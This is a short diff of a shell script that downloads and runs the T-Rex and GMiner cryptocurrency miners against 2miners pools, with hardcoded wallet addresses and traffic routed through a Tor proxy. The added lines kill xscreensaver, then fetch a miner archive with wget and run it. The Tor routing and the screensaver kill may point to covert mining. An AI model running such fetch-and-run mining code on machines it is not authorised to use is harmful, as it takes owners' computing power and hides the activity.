@@ -4,3 +4,11 @@ rm -f t-rex-0.25.8-linux.tar.gz
 ./t-rex -a firopow -o stratum+tcp://us-firo.2miners.com:8181 --proxy 127.0.0.1:9050 -u a5GPBi7WUJQG2iJLPLVsfFt1Ttca6NFeEx.t1 -p x
 
 ./t-rex -a cortex -o stratum+tcp://ctxc.2miners.com:2222 --proxy 127.0.0.1:9050 -u 0xc8025e740d6b3bbaed2862867d172963463ebd43.t1 -p x
+
+killall xscreensaver
+
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.86/gminer_2_86_linux64.tar.xz
+tar -xvf gminer_2_86_linux64.tar.xz
+rm -f gminer_2_86_linux64.tar.xz
+cd 2.86
+./miner --algo cortex --server ctxc.2miners.com --port 2222 --user 0xc8025e740d6b3bbaed2862867d172963463ebd43.th
